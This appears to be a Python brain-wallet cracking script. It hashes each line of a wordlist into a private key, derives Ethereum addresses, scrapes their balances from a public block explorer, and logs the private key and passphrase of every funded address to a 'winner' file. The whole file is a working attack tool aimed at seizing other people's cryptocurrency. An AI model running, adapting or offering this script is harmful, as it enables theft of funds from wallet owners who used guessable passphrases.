# -*- coding: utf-8 -*-
"""
Created on Mon Jun 27 03:44:11 2022

@author: PyMmdrza
"""

import codecs
import hashlib
import random
from colorama import Fore, Style
import secp256k1 as ice
import ecdsa
import requests
from lxml import html


# Start Color =============
Cyan = Fore.CYAN
Yellow = Fore.YELLOW
Red = Fore.RED
Green = Fore.GREEN
White = Fore.WHITE
Magenta = Fore.MAGENTA
# End Color ===============


def xBal(address):
    urlblock = f"https://ethereum.atomicwallet.io/address/{address}"
    respone_block = requests.get(urlblock)
    byte_string = respone_block.content
    source_code = html.fromstring(byte_string)
    xpatch_txid = '/html/body/main/div/div[2]/div[1]/table/tbody/tr[4]/td[2]'
    treetxid = source_code.xpath(xpatch_txid)
    return str(treetxid[0].text_content())


mylist = []

with open('words.txt', newline='', encoding='utf-8') as f:
    mylist.extend(line.strip() for line in f)


class BrainWallet:

    @staticmethod
    def generate_address_from_passphrase(passphrase):
        private_key = hashlib.sha256(passphrase.encode('utf-8')).hexdigest()
        address = BrainWallet.generate_address_from_private_key(private_key)
        return private_key, address

    @staticmethod
    def generate_address_from_private_key(private_key):
        public_key = BrainWallet.__private_to_public(private_key)
        return BrainWallet.__public_to_address(public_key)

    @staticmethod
    def __private_to_public(private_key):
        private_key_bytes = codecs.decode(private_key, 'hex')
        key = ecdsa.SigningKey.from_string(
            private_key_bytes, curve=ecdsa.SECP256k1).verifying_key
        key_bytes = key.to_string()
        key_hex = codecs.encode(key_bytes, 'hex')
        bitcoin_byte = b'04'
        return bitcoin_byte + key_hex

    @staticmethod
    def __public_to_address(public_key):
        public_key_bytes = codecs.decode(public_key, 'hex')
        # Run SHA256 for the public key
        sha256_bpk = hashlib.sha256(public_key_bytes)
        sha256_bpk_digest = sha256_bpk.digest()
        ripemd160_bpk = hashlib.new('ripemd160')
        ripemd160_bpk.update(sha256_bpk_digest)
        ripemd160_bpk_digest = ripemd160_bpk.digest()
        ripemd160_bpk_hex = codecs.encode(ripemd160_bpk_digest, 'hex')
        network_byte = b'00'
        network_bitcoin_public_key = network_byte + ripemd160_bpk_hex
        network_bitcoin_public_key_bytes = codecs.decode(
            network_bitcoin_public_key, 'hex')
        sha256_nbpk = hashlib.sha256(network_bitcoin_public_key_bytes)
        sha256_nbpk_digest = sha256_nbpk.digest()
        sha256_2_nbpk = hashlib.sha256(sha256_nbpk_digest)
        sha256_2_nbpk_digest = sha256_2_nbpk.digest()
        sha256_2_hex = codecs.encode(sha256_2_nbpk_digest, 'hex')
        checksum = sha256_2_hex[:8]
        address_hex = (network_bitcoin_public_key + checksum).decode('utf-8')
        return BrainWallet.base58(address_hex)

    @staticmethod
    def base58(address_hex):
        alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
        b58_string = ''
        leading_zeros = len(address_hex) - len(address_hex.lstrip('0'))
        address_int = int(address_hex, 16)
        while address_int > 0:
            digit = address_int % 58
            digit_char = alphabet[digit]
            b58_string = digit_char + b58_string
            address_int //= 58
        ones = leading_zeros // 2
        for _ in range(ones):
            b58_string = f'1{b58_string}'
        return b58_string


count = 0
start = 3
win = 0
for i in range(len(mylist)):
    count += 2
    passphrase = mylist[i]
    wallet = BrainWallet()
    private_key, address = wallet.generate_address_from_passphrase(passphrase)
    ran = int(private_key, 16)
    addr = ice.privatekey_to_ETH_address(ran)
    priv: str = private_key
    bal = xBal(addr)
    if int(bal) > 0:
        win += 1
        with open("EthWinnerFile_BrainPro.txt", "a") as f:
            f.write(
                (
                    (
                        (
                            '\nAddress: '
                            + str(addr)
                            + '           BALANCE:'
                            + str(bal)
                            + '\n PRIVATEKEY: '
                            + priv
                            + '\nPassphrase: '
                        )
                        + str(passphrase)
                        + '\nDEC: '
                    )
                    + str(ran)
                    + '\n-------------- M M D R Z A . C o M ------------\n'
                )
            )
            f.close()

            print(
                Green,
                'Address:',
                Magenta,
                addr,
                Green,
                'Key:',
                White,
                priv,
                Magenta,
                ' ---- {BALANCE}:',
                Cyan,
                bal,
                Yellow,
                ' {Passphrase}:',
                White,
                passphrase,
            )
    else:
        print(
            Cyan,
            count,
            ' Win:',
            win,
            Red,
            'Address:',
            Yellow,
            addr,
            Red,
            'Key:',
            White,
            priv,
            Magenta,
            ' ---- {BALANCE}:',
            Cyan,
            bal,
            Yellow,
            ' {Passphrase}:',
            White,
            passphrase,
        )
